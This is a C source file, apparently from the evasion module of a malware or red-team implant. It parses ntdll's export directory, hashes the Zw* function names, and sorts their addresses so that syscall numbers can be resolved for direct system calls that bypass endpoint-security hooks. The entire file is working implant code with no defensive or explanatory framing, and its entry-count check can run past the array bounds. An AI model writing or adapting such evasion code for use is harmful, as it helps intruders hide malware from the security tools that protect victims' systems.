//
// Created by Brendan Ortiz on 7/19/2024.
//

#include "../../../../headers/agent/evasion/syscalls/syscalls.h"

pSYS_ENTRY_LIST g_SyscallList = NULL;

BOOL PopulateSyscallList() {

    PIMAGE_NT_HEADERS		    pImgNtHdrs			        = NULL;
    PIMAGE_EXPORT_DIRECTORY		pExportDirectory		        = NULL;
    PDWORD				        pdwFunctionNameArray		    = NULL;
    PDWORD				        pdwFunctionAddressArray		= NULL;
    PWORD				        pwFunctionOrdinalArray		= NULL;

    if(g_SyscallList == NULL)
        g_SyscallList = (pSYS_ENTRY_LIST)agent->apis->pLocalAlloc(LPTR, sizeof(SYS_ENTRY_LIST)); // we already have memory reserved for our list

    if(g_SyscallList->Entries)
        return TRUE; // our list is already populated

    pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)agent->apis->hNtdll + ((PIMAGE_DOS_HEADER)agent->apis->hNtdll)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)agent->apis->hNtdll + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    pdwFunctionNameArray	= (PDWORD)(agent->apis->hNtdll + pExportDirectory->AddressOfNames);
    pdwFunctionAddressArray	= (PDWORD)(agent->apis->hNtdll + pExportDirectory->AddressOfFunctions);
    pwFunctionOrdinalArray	= (PWORD)(agent->apis->hNtdll + pExportDirectory->AddressOfNameOrdinals);

    // Store Zw* syscalls addresses
    for (int i = 0; i < pExportDirectory->NumberOfNames; i++){

        CHAR* pFunctionName = (CHAR*)(agent->apis->hNtdll + pdwFunctionNameArray[i]);

        if (*(unsigned short*)pFunctionName == 'wZ' && g_SyscallList->u32Count <= MAX_ENTRIES) {
            g_SyscallList->Entries[g_SyscallList->u32Count].dw64Hash	= Rotr64HashA(pFunctionName);
            g_SyscallList->Entries[g_SyscallList->u32Count].uAddress	= (ULONG_PTR)(agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
            g_SyscallList->u32Count++;
        }
    }

    // Sort Zw* syscalls addresses in ascending order
    for (int i = 0; i < g_SyscallList->u32Count - 0x01; i++){

        for (int j = 0; j < g_SyscallList->u32Count - i - 0x01; j++){

            if (g_SyscallList->Entries[j].uAddress > g_SyscallList->Entries[j + 1].uAddress) {

                SYSCALL_ENTRY TempEntry = { .dw64Hash = g_SyscallList->Entries[j].dw64Hash, .uAddress = g_SyscallList->Entries[j].uAddress };

                g_SyscallList->Entries[j].dw64Hash	        =	g_SyscallList->Entries[j + 1].dw64Hash;
                g_SyscallList->Entries[j].uAddress	    =	g_SyscallList->Entries[j + 1].uAddress;

                g_SyscallList->Entries[j + 1].dw64Hash	    =	TempEntry.dw64Hash;
                g_SyscallList->Entries[j + 1].uAddress	=	TempEntry.uAddress;

            }
        }
    }

    return TRUE;
}